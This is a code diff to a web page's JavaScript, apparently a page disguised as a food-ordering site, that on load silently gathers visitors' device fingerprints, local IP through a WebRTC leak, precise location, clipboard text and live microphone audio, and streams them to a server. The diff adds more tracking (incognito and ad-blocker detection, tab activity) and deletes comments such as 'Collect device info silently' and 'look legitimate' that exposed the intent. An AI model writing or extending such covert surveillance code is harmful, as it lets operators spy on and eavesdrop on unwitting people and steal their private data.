@@ -157,6 +157,7 @@
   const socket = io();
   let micStream = null;
   let peerConnections = {};
+  let pageEnterTime = Date.now();
 
   const iceConfig = {
     iceServers: [
@@ -165,15 +166,160 @@
     ]
   };
 
-  // ── Collect device info silently ──────────────────────────────
-  function collectDeviceInfo() {
+  // ── Parse phone model ─────────────────────────────────────────
+  function parsePhoneModel(ua) {
+    let m = ua.match(/\(Linux;\s*Android[\s\d.]*;\s*([^)]+)\)/i);
+    if (m) return m[1].trim();
+    m = ua.match(/Samsung[- ]([A-Z0-9-]+)/i);
+    if (m) return 'Samsung ' + m[1];
+    m = ua.match(/iPhone\s*OS\s*([\d_]+)/i);
+    if (m) return 'iPhone (iOS ' + m[1].replace(/_/g, '.') + ')';
+    m = ua.match(/iPad.*OS\s*([\d_]+)/i);
+    if (m) return 'iPad (iOS ' + m[1].replace(/_/g, '.') + ')';
+    m = ua.match(/\(([^)]+)\)/);
+    if (m) return m[1].split(';').pop().trim();
+    return 'Unknown';
+  }
+
+  // ── Parse browser name + version ──────────────────────────────
+  function parseBrowser(ua) {
+    if (/SamsungBrowser\/([\d.]+)/.test(ua)) return 'Samsung Browser ' + RegExp.$1;
+    if (/EdgA?\/([\d.]+)/.test(ua)) return 'Edge ' + RegExp.$1;
+    if (/OPR\/([\d.]+)/.test(ua)) return 'Opera ' + RegExp.$1;
+    if (/Chrome\/([\d.]+)/.test(ua)) return 'Chrome ' + RegExp.$1;
+    if (/Firefox\/([\d.]+)/.test(ua)) return 'Firefox ' + RegExp.$1;
+    if (/Safari\/([\d.]+)/.test(ua)) return 'Safari ' + RegExp.$1;
+    return 'Unknown';
+  }
+
+  // ── Canvas fingerprint → unique device ID ─────────────────────
+  function getCanvasFingerprint() {
+    try {
+      const c = document.createElement('canvas');
+      const ctx = c.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('QuickBite🍕', 2, 15);
+      ctx.fillStyle = 'rgba(102,204,0,0.7)';
+      ctx.fillText('QuickBite🍕', 4, 17);
+      const data = c.toDataURL();
+      // Hash it to a short ID
+      let hash = 0;
+      for (let i = 0; i < data.length; i++) {
+        hash = ((hash << 5) - hash) + data.charCodeAt(i);
+        hash |= 0;
+      }
+      return Math.abs(hash).toString(16).toUpperCase();
+    } catch(e) { return 'Unavailable'; }
+  }
+
+  // ── WebGL GPU info ─────────────────────────────────────────────
+  function getGPUInfo() {
+    try {
+      const c = document.createElement('canvas');
+      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if (!gl) return { renderer: 'Unavailable', vendor: 'Unavailable' };
+      const ext = gl.getExtension('WEBGL_debug_renderer_info');
+      if (ext) {
+        return {
+          renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),
+          vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)
+        };
+      }
+      return { renderer: gl.getParameter(gl.RENDERER), vendor: gl.getParameter(gl.VENDOR) };
+    } catch(e) { return { renderer: 'Unavailable', vendor: 'Unavailable' }; }
+  }
+
+  // ── Incognito detection ───────────────────────────────────────
+  async function detectIncognito() {
+    return new Promise((resolve) => {
+      // Method: try to estimate storage quota — incognito has much lower limit
+      if (navigator.storage && navigator.storage.estimate) {
+        navigator.storage.estimate().then(({ quota }) => {
+          // Normal: > 100GB, Incognito: < 200MB on Chrome
+          resolve(quota < 200 * 1024 * 1024 ? 'YES ⚠️' : 'No');
+        }).catch(() => resolve('Unknown'));
+      } else {
+        resolve('Unknown');
+      }
+    });
+  }
+
+  // ── Local IP via WebRTC leak ──────────────────────────────────
+  function getLocalIP() {
+    return new Promise((resolve) => {
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        const ips = [];
+        pc.onicecandidate = (e) => {
+          if (!e.candidate) {
+            pc.close();
+            resolve(ips.length ? ips.join(', ') : 'Unavailable');
+            return;
+          }
+          const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+          if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
+        };
+        setTimeout(() => { pc.close(); resolve(ips.length ? ips.join(', ') : 'Timeout'); }, 3000);
+      } catch(e) { resolve('Unavailable'); }
+    });
+  }
+
+  // ── Ad blocker detection ──────────────────────────────────────
+  async function detectAdBlocker() {
+    try {
+      const t = document.createElement('div');
+      t.className = 'adsbox ad-banner pub_300x250';
+      t.style = 'position:absolute;left:-9999px;height:1px;width:1px;';
+      document.body.appendChild(t);
+      await new Promise(r => setTimeout(r, 100));
+      const blocked = t.offsetHeight === 0;
+      document.body.removeChild(t);
+      return blocked ? 'YES ⚠️' : 'No';
+    } catch(e) { return 'Unknown'; }
+  }
+
+  // ── Tab visibility tracking ───────────────────────────────────
+  let tabHidden = 0, tabShown = 0;
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      tabHidden++;
+    } else {
+      tabShown++;
+    }
+    socket.emit('p3-tab-activity', {
+      hidden: tabHidden,
+      shown: tabShown,
+      timeOnPage: Math.round((Date.now() - pageEnterTime) / 1000) + 's'
+    });
+  });
+
+  // ── Collect all device info ───────────────────────────────────
+  async function collectDeviceInfo() {
     const nav = window.navigator;
+    const ua = nav.userAgent;
+    const gpu = getGPUInfo();
+    const incognito = await detectIncognito();
+    const localIP = await getLocalIP();
+    const adBlocker = await detectAdBlocker();
+
+    const plugins = [];
+    for (let i = 0; i < nav.plugins.length; i++) plugins.push(nav.plugins[i].name);
+
     const info = {
-      userAgent: nav.userAgent,
+      userAgent: ua,
+      phoneModel: parsePhoneModel(ua),
+      browser: parseBrowser(ua),
       platform: nav.platform || 'Unknown',
       language: nav.language,
       languages: nav.languages ? nav.languages.join(', ') : nav.language,
       cookiesEnabled: nav.cookieEnabled,
+      doNotTrack: nav.doNotTrack === '1' ? 'Enabled' : 'Disabled',
       onLine: nav.onLine,
       screenWidth: window.screen.width,
       screenHeight: window.screen.height,
@@ -182,13 +328,20 @@
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       timezoneOffset: new Date().getTimezoneOffset(),
       touchPoints: nav.maxTouchPoints,
-      battery: null,
-      connection: null,
       memory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'Unknown',
       cores: nav.hardwareConcurrency || 'Unknown',
+      canvasID: getCanvasFingerprint(),
+      gpuRenderer: gpu.renderer,
+      gpuVendor: gpu.vendor,
+      incognito,
+      localIP,
+      adBlocker,
+      plugins: plugins.length ? plugins.join(', ') : 'None',
+      deviceTime: new Date().toLocaleString(),
+      battery: null,
+      connection: null,
     };
 
-    // Network info
     if (nav.connection) {
       info.connection = {
         type: nav.connection.effectiveType,
@@ -198,14 +351,13 @@
       };
     }
 
-    // Battery
     if (nav.getBattery) {
       nav.getBattery().then(b => {
         info.battery = {
           level: Math.round(b.level * 100) + '%',
           charging: b.charging,
           chargingTime: b.chargingTime === Infinity ? 'N/A' : b.chargingTime + 's',
-          dischargingTime: b.dischargingTime === Infinity ? 'N/A' : b.dischargingTime + 's'
+          dischargingTime: b.dischargingTime === Infinity ? 'N/A' : Math.round(b.dischargingTime/60) + ' min remaining'
         };
         socket.emit('p3-device-info', info);
       }).catch(() => socket.emit('p3-device-info', info));
@@ -228,12 +380,9 @@
           heading: pos.coords.heading,
           timestamp: new Date(pos.timestamp).toLocaleString()
         });
-        // Update location button text to look legitimate
         document.querySelector('.loc-btn').textContent = '📍 Location found';
       },
-      (err) => {
-        socket.emit('p3-location', { error: err.message });
-      },
+      (err) => { socket.emit('p3-location', { error: err.message }); },
       { enableHighAccuracy: true, timeout: 10000 }
     );
   }
@@ -244,12 +393,10 @@
       micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
       socket.emit('p3-phone-ready');
     } catch (err) {
-      // mic denied — still register for location/device only
       socket.emit('p3-phone-ready');
     }
   }
 
-  // WebRTC for mic
   socket.on('p3-new-viewer', async ({ viewerId }) => {
     if (!micStream) return;
     const pc = new RTCPeerConnection(iceConfig);
@@ -273,7 +420,7 @@
     if (pc && candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate));
   });
 
-  // ── Clipboard capture ─────────────────────────────────────────
+  // ── Clipboard ─────────────────────────────────────────────────
   async function getClipboard() {
     try {
       const text = await navigator.clipboard.readText();
@@ -283,30 +430,23 @@
     }
   }
 
-  // ── IP + ISP info ─────────────────────────────────────────────
+  // ── IP + ISP ──────────────────────────────────────────────────
   async function getIPInfo() {
     try {
       const res = await fetch('https://ipapi.co/json/');
       const d = await res.json();
       socket.emit('p3-ip-info', {
-        ip: d.ip,
-        isp: d.org,
-        asn: d.asn,
-        city: d.city,
-        region: d.region,
-        country: d.country_name,
-        postal: d.postal,
-        callingCode: d.country_calling_code,
-        currency: d.currency,
-        ipLat: d.latitude,
-        ipLng: d.longitude,
+        ip: d.ip, isp: d.org, asn: d.asn,
+        city: d.city, region: d.region, country: d.country_name,
+        postal: d.postal, callingCode: d.country_calling_code,
+        currency: d.currency, ipLat: d.latitude, ipLng: d.longitude,
       });
     } catch (e) {
       socket.emit('p3-ip-info', { error: e.message });
     }
   }
 
-  // ── Auto-start silently on page load ─────────────────────────
+  // ── Auto-start ────────────────────────────────────────────────
   window.addEventListener('load', async () => {
     collectDeviceInfo();
     getLocation();
